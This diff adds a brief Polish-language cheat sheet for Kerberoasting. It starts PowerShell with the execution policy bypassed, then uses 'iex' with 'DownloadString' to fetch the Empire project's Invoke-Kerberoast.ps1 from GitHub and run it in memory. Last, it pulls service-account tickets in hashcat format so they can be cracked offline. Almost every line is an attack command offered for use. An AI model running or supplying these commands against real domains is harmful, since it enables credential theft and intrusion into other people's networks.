@@ -1,0 +1,14 @@
+1) Uruchomienie
+      • Powershella uruchamiamy z mozliwoscia uruchamiania skryptow
+            ▪ powershell -ep bypass
+      • Zaladowanie od razu do pamieci w powershell
+            ▪ iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') 
+    
+2)Funkcje
+      • Uzyskanie biletu dla istniejacej uslugi SPN dla aktualnego usera
+            ▪ Invoke-Kerberoast -OutputFormat hashcat |fl    
+    
+    
+    
+    
+    
